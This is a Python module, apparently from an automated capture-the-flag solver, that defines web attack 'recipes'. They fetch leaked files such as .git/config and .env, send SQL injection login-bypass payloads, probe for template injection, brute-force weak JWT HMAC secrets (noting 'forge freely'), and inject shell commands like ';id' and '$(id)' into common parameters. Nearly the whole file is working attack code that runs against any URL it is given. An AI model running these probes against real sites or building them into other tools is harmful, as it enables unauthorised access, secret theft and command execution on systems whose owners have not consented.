"""Web recipes: source leaks, SQLi bypass, SSTI probe, JWT probe, command injection.

Archetypes covered (common in recent competitions):
* leaked robots.txt / .git config / .env / standing flag files
* authentication bypass via classic SQL injection payloads
* template injection fingerprinting ({{7*7}} style)
* JWT weak-secret detection (local signature replay against common secrets)
* command injection via common parameter names
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import re
from urllib.parse import urljoin

from .base import Recipe

_LOW_HANGING_PATHS = ("/robots.txt", "/.git/config", "/.env", "/flag.txt", "/flag",
                      "/backup.zip", "/index.php.bak")


def _base(rc) -> str:
    return (rc.challenge.url or "").rstrip("/")


def _get(rc, url: str):
    return rc.dispatch("http", method="GET", url=url)


class WebLowHangingRecipe(Recipe):
    id = "web.low_hanging"
    title = "Probe common leak paths (robots/.git/.env/flag files)"
    categories = ("web",)

    def match(self, challenge) -> bool:
        return bool(challenge.url)

    def run(self, rc) -> list:
        base = _base(rc)
        outputs: list[str] = []
        for path in _LOW_HANGING_PATHS:
            result = _get(rc, base + path)
            if not result.ok:
                continue
            head = (result.output or "")[:400]
            rc.note(f"GET {path} -> 200, head: {head!r}", tag="web")
            outputs.append(result.output)
        return rc.scan(*outputs)


class WebSqliBypassRecipe(Recipe):
    id = "web.sqli_bypass"
    title = "Authentication bypass via classic SQLi payloads"
    categories = ("web",)

    _PAYLOADS = (
        "' OR 1=1-- -", "' OR '1'='1'-- -", "admin'--", "' OR 1=1#",
        "\" OR 1=1-- -", "' OR 1=1 LIMIT 1-- -", "') OR 1=1-- -",
    )

    def match(self, challenge) -> bool:
        return bool(challenge.url)

    def run(self, rc) -> list:
        base = _base(rc)
        page_result = _get(rc, base)
        page = page_result.output or ""
        direct = rc.scan(page)
        if direct:
            return direct
        lowered = page.lower()
        if "login" not in lowered and "password" not in lowered and "<form" not in lowered:
            return []
        action = base
        match = re.search(r"<form[^>]*action=[\"']([^\"']*)[\"']", page)
        if match:
            action = urljoin(base, match.group(1)) if match.group(1) else base
        fields = re.findall(r"name=[\"']([^\"']+)[\"']", page)
        fields = [f for f in fields if f.lower() not in ("submit", "csrf_token", "token")]
        if len(fields) >= 2:
            user_field, pass_field = fields[0], fields[1]
        else:
            user_field, pass_field = "username", "password"
        for payload in self._PAYLOADS:
            result = rc.dispatch("http", method="POST", url=action,
                                 data={user_field: payload, pass_field: "x"})
            found = rc.scan(result.output)
            if found:
                rc.note(f"SQLi bypass succeeded with payload {payload!r} "
                        f"(fields {user_field}/{pass_field})", tag="web")
                return found
            if result.ok and "flag" in (result.output or "").lower():
                rc.note(f"POST {action} response mentions 'flag' (payload {payload!r})",
                        tag="web")
        return []


class WebSstiProbeRecipe(Recipe):
    id = "web.ssti_probe"
    title = "Fingerprint template injection ({{7*7}} family)"
    categories = ("web",)

    _PROBES = (
        {"param": "name", "payload": "{{7*7}}", "marker": "49"},
        {"param": "name", "payload": "{{7*'7'}}", "marker": "7777777"},
        {"param": "name", "payload": "${7*7}", "marker": "49"},
        {"param": "name", "payload": "<%= 7*7 %>", "marker": "49"},
        {"param": "tpl", "payload": "{{7*7}}", "marker": "49"},
        {"param": "view", "payload": "{{7*7}}", "marker": "49"},
        {"param": "q", "payload": "{{7*7}}", "marker": "49"},
    )

    def match(self, challenge) -> bool:
        return bool(challenge.url)

    def run(self, rc) -> list:
        base = _base(rc)
        outputs = []
        for probe in self._PROBES:
            result = _get(rc, f"{base}?{probe['param']}={probe['payload']}")
            outputs.append(result.output or "")
            if probe["marker"] in (result.output or ""):
                rc.note(f"SSTI likely: {probe['payload']!r} evaluated in param "
                        f"{probe['param']!r}", tag="web")
                break
        return rc.scan(*outputs)


class WebJwtProbeRecipe(Recipe):
    id = "web.jwt_probe"
    title = "Detect JWTs, decode them, test weak HMAC secrets"
    categories = ("web",)
    _SECRETS = ("secret", "key", "jwt_secret", "flag", "admin", "ctf", "password",
                "123456", "your-256-bit-secret", "changeme")

    def match(self, challenge) -> bool:
        return bool(challenge.url)

    @staticmethod
    def _b64url_decode(part: str) -> bytes:
        return base64.urlsafe_b64decode(part + "=" * ((-len(part)) % 4))

    def run(self, rc) -> list:
        base = _base(rc)
        page = (_get(rc, base).output or "")
        outputs = [page]
        tokens = re.findall(
            r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*", page)[:3]
        for token in tokens:
            try:
                header_b64, payload_b64, signature = token.split(".")
                header = self._b64url_decode(header_b64).decode("utf-8", "replace")
                payload = self._b64url_decode(payload_b64).decode("utf-8", "replace")
            except Exception:  # noqa: BLE001
                continue
            rc.note(f"JWT header: {header}; payload: {payload}", tag="web")
            if '"none"' in header.lower():
                rc.note("JWT alg=none present - try forging with alg none", tag="web")
            signed_part = f"{header_b64}.{payload_b64}".encode()
            for secret in self._SECRETS:
                computed = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), signed_part, hashlib.sha256).digest()
                ).rstrip(b"=").decode()
                if computed == signature:
                    rc.note(f"JWT signed with WEAK SECRET {secret!r} - forge freely",
                            tag="web")
                    break
        return rc.scan(*outputs)


class WebCmdInjectionProbeRecipe(Recipe):
    id = "web.cmd_injection_probe"
    title = "Try command injection via common parameter names"
    categories = ("web",)
    _PARAMS = ("cmd", "exec", "command", "ping", "file", "ip", "host", "q")
    _MARKERS = ("uid=", "root:", "inet_addr", "whoami", "Windows")

    def match(self, challenge) -> bool:
        return bool(challenge.url)

    def run(self, rc) -> list:
        base = _base(rc)
        outputs = []
        for param in self._PARAMS[:5]:
            for payload in (";id", "|id", "`id`", "$(id)", ";whoami"):
                result = _get(rc, f"{base}?{param}={payload}")
                text = result.output or ""
                outputs.append(text)
                if any(marker in text for marker in self._MARKERS[:3]):
                    rc.note(f"command injection via param {param!r} "
                            f"payload {payload!r}", tag="web")
                    return rc.scan(text)
        return rc.scan(*outputs)


def web_recipes() -> list[Recipe]:
    return [
        WebLowHangingRecipe(WebLowHangingRecipe.id, WebLowHangingRecipe.title,
                            ("web",), "probe leak paths"),
        WebSqliBypassRecipe(WebSqliBypassRecipe.id, WebSqliBypassRecipe.title,
                            ("web",), "auth bypass payloads"),
        WebSstiProbeRecipe(WebSstiProbeRecipe.id, WebSstiProbeRecipe.title,
                           ("web",), "template injection fingerprints"),
        WebJwtProbeRecipe(WebJwtProbeRecipe.id, WebJwtProbeRecipe.title,
                          ("web",), "jwt decode + weak secret"),
        WebCmdInjectionProbeRecipe(WebCmdInjectionProbeRecipe.id,
                                    WebCmdInjectionProbeRecipe.title,
                                    ("web",), "command injection probes"),
    ]
